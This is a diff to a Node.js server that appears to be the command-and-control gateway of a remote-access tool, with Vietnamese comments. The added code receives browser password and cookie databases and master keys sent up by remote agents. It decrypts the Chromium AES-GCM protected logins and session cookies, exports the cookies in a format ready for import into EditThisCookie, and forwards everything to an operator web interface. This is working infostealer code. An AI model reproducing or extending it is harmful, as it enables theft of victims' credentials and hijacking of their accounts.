@@ -7,6 +7,18 @@ const net = require("net");
 const dgram = require("dgram");
 const os = require("os");
 const { spawn } = require("child_process");
+const crypto = require("crypto");
+const fs = require("fs");
+
+// Thử import thư viện SQLite, nếu chưa cài thì báo lỗi rõ ràng
+let Database;
+try {
+    Database = require("better-sqlite3");
+} catch (e) {
+    console.error("\n[ERROR] Missing 'better-sqlite3' library.");
+    console.error("Please run: npm install better-sqlite3\n");
+    process.exit(1);
+}
 
 // --- CẤU HÌNH ---
 const CFG = {
@@ -111,6 +123,58 @@ const tcpServer = net.createServer((socket) => {
             try {
                 const msg = JSON.parse(line);
                 
+                // === XỬ LÝ GÓI TIN ĐA PROFILE (MỚI) ===
+                if (msg.type === "credentials_package_multi") {
+                    console.log(`[Gateway] Received ${msg.dbs.length} databases from ${msg.browser}.`);
+                    
+                    let allPasswords = [];
+                    
+                    // Duyệt qua từng DB (Profile) gửi lên
+                    for (const dbInfo of msg.dbs) {
+                        console.log(`[Gateway] Trying profile: ${dbInfo.profile}...`);
+                        const passwords = decryptPasswords(msg.master_key, dbInfo.data);
+                        
+                        if (passwords.length > 0) {
+                            console.log(`   -> SUCCESS! Found ${passwords.length} passwords.`);
+                            // Gộp kết quả
+                            allPasswords = allPasswords.concat(passwords);
+                        } else {
+                            console.log(`   -> Failed or Empty.`);
+                        }
+                    }
+
+                    // Gửi tổng kết quả về Web UI
+                    if (webClient?.readyState === WebSocket.OPEN) {
+                        webClient.send(JSON.stringify({
+                            type: "passwords_result",
+                            browser: msg.browser,
+                            data: allPasswords
+                        }));
+                    }
+                    continue;
+                }
+
+                if (msg.type === "cookies_package_multi") {
+                    console.log(`[Gateway] Received Cookies DBs from ${msg.browser}.`);
+                    let allCookies = [];
+                    
+                    for (const dbInfo of msg.dbs) {
+                        const cookies = decryptCookies(msg.master_key, dbInfo.data);
+                        if (cookies.length > 0) allCookies = allCookies.concat(cookies);
+                    }
+
+                    if (webClient?.readyState === WebSocket.OPEN) {
+                        webClient.send(JSON.stringify({
+                            type: "cookies_result",
+                            browser: msg.browser,
+                            data: allCookies
+                        }));
+                    }
+                    continue;
+                }
+
+                // ==============================
+
                 if (msg.type === "hello") {
                     agent.info = { ...agent.info, hostname: msg.hostname, os: msg.os };
                     console.log(`[TCP] Registered: ${agent.info.hostname} (${id})`);
@@ -176,6 +240,139 @@ setInterval(() => {
         }
     });
 }, CFG.CLEANUP_MS);
+
+// --- HÀM GIẢI MÃ PASSWORD (AES-GCM) ---
+function decryptPasswords(masterKeyB64, dbFileB64) {
+    let db = null;
+    const tempDbName = `temp_${Date.now()}.db`;
+
+    console.log("--- FINAL DECRYPTION LOGIC (Strict v10/v20) ---");
+    try {
+        if (!masterKeyB64 || !dbFileB64) return [];
+
+        const masterKey = Buffer.from(masterKeyB64, 'base64');
+        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
+
+        db = new Database(tempDbName);
+        const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
+        const results = [];
+
+        rows.forEach((row, index) => {
+            if (!row.password_value || !row.username_value) return;
+            
+            try {
+                const buffer = row.password_value;
+                const totalLength = buffer.length;
+                
+                // Cần ít nhất 31 byte: 3 (prefix) + 12 (IV) + X (Ciphertext) + 16 (Tag)
+                if (totalLength < 31) return; 
+
+                const prefix = buffer.slice(0, 3).toString('utf8');
+                
+                // CHỈ CHẤP NHẬN CÁC CHUẨN MÃ HÓA SỬ DỤNG MASTER KEY
+                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
+                    
+                    const iv = buffer.slice(3, 15);
+                    const tag = buffer.slice(-16);
+                    const ciphertext = buffer.slice(15, totalLength - 16);
+                    
+                    if (iv.length !== 12 || tag.length !== 16) return; // Kiểm tra kích thước nghiêm ngặt
+
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                    decipher.setAuthTag(tag);
+                    
+                    let clear = decipher.update(ciphertext) + decipher.final('utf8');
+                    
+                    if (clear && clear.length > 0) {
+                        results.push({
+                            url: row.origin_url,
+                            user: row.username_value,
+                            pass: clear
+                        });
+                    }
+                }
+            } catch(e) {
+                // Lỗi giải mã vẫn xảy ra ở đây nếu Key sai, nhưng ta biết Key đúng.
+                // Do đó, lỗi này chỉ là Key không khớp với File (dữ liệu file bị lỗi/lẫn)
+            }
+        });
+        
+        console.log(`--- FINISHED. Decrypted: ${results.length} / ${rows.length} ---`);
+        return results;
+    } catch (e) {
+        console.error("[CRASH] Decryption fatal error:", e.message);
+        return [];
+    } finally {
+        if (db) db.close();
+        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
+    }
+}
+
+// --- DECRYPT COOKIES FUNCTION ---
+function decryptCookies(masterKeyB64, dbFileB64) {
+    let db = null;
+    const tempDbName = `temp_cookies_${Date.now()}.db`;
+    const results = [];
+
+    // Nếu không có key hoặc file DB -> trả về rỗng
+    if (!masterKeyB64 || !dbFileB64) return [];
+
+    console.log("--- DECRYPTING COOKIES ---");
+    try {
+        const masterKey = Buffer.from(masterKeyB64, 'base64');
+        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
+
+        db = new Database(tempDbName);
+        
+        // Lấy dữ liệu từ bảng cookies
+        // Các trình duyệt mới lưu encrypted_value
+        const rows = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies").all();
+
+        rows.forEach((row) => {
+            if (!row.encrypted_value) return;
+            
+            try {
+                const buffer = row.encrypted_value;
+                const prefix = buffer.slice(0, 3).toString('utf8');
+                let iv, ciphertext, tag, clearText;
+
+                // Logic giải mã v10/v20 (AES-GCM)
+                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
+                    iv = buffer.slice(3, 15);
+                    ciphertext = buffer.slice(15, buffer.length - 16);
+                    tag = buffer.slice(-16);
+
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                    decipher.setAuthTag(tag);
+                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
+                } 
+                
+                if (clearText) {
+                    // Định dạng JSON chuẩn để import vào EditThisCookie
+                    results.push({
+                        domain: row.host_key,
+                        name: row.name,
+                        value: clearText,
+                        path: row.path,
+                        secure: !!row.is_secure,
+                        expirationDate: (row.expires_utc / 1000000) - 11644473600 // Chuyển đổi timestamp Webkit
+                    });
+                }
+            } catch(e) { 
+                // Bỏ qua lỗi từng dòng (do key sai hoặc data lỗi)
+            }
+        });
+        
+        console.log(`--- COOKIES: Decrypted ${results.length} items.`);
+        return results;
+    } catch (e) {
+        console.error("Cookie Decrypt Error:", e.message);
+        return [];
+    } finally {
+        if (db) db.close();
+        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
+    }
+}
 
 // --- START ---
 server.listen(CFG.HTTP_PORT, "0.0.0.0", () => {
